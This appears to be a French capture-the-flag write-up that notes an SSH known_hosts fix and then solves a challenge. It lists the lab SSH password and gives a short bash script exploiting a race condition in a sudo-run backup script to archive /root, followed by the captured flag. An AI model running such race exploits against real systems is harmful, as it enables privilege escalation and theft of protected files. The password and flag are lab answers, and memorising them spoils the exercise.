
Quand il y a cette erreur:
```
ssh martin@192.168.122.100
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ED25519 key sent by the remote host is
SHA256:fwcKDPJ1FPqk/98vDLPS2XbBCFxdYmUBgWHuCCBKP+Q.
Please contact your system administrator.
Add correct host key in /home/theo/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/theo/.ssh/known_hosts:48
Host key for 192.168.122.100 has changed and you have requested strict checking.
Host key verification failed.
```

Faire la commande:
```
ssh-keygen -R 192.168.122.100
```

## Chall 3

```
USER: martin
SSH PASSWORD: Th1s_Ch4ll_Is_N0t_S0_E4sy
```


```
sudo -l
```

![[Pasted image 20260122184756.png]]

```
#!/bin/bash

echo '{"directories_to_archive":["/home/martin"],"destination":"/home/martin/backups/"}' > task.json

sudo /usr/bin/backy.sh task.json &

sleep 0.02

echo '{"directories_to_archive":["/root"],"destination":"/home/martin/backups/"}' > task.json

```


![[Pasted image 20260122184102.png]]

```
tar -tf backup.tar
```

![[Pasted image 20260122184216.png]]

```
tar -xf backup.tar
```

![[Pasted image 20260122184347.png]]

```
0xECE{R4C3_W1NS_B3F0R3_CH3CK}
```